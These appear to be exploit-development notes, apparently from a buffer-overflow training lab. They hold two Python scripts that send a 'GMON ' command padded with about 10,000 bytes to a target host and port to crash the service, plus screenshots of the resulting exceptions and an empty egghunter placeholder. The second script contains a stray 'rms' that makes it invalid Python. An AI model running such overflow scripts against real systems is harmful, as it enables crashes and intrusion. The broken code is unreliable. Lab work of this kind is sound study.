# Initial payload

- Code

```
#!/usr/bin/python

import socket
import os
import sys
from struct import pack


host = sys.argv[1]
port = int(sys.argv[2])
egghunter = b""

buffer =  b"GMON "
buffer += b"./"*10000

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print (s.recv(1024))
s.send(buffer)
print (s.recv(1024))
s.close()
```

- Screenshot

![4b749a6b29b95f05cfd940b537976ac8.png](../_resources/4b749a6b29b95f05cfd940b537976ac8.png)

# Update Payload 00

## Code

```
#!/usr/bin/python

import socket
import os
import sys
from struct import pack

host = sys.argv[1]
port = int(sys.argv[2])
egghunter = b""

buffer =  b"GMON "rms
buffer += b"./"+b"A"*10000

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print (s.recv(1024))
s.send(buffer)
print (s.recv(1024))
s.close()
```

## Screenshot
### 1st exception
![4111638e417036fff6709e9697968f53.png](../_resources/4111638e417036fff6709e9697968f53.png)

### 2nd exception
![b55db23946d64bd6e022845e470e316a.png](../_resources/b55db23946d64bd6e022845e470e316a.png)



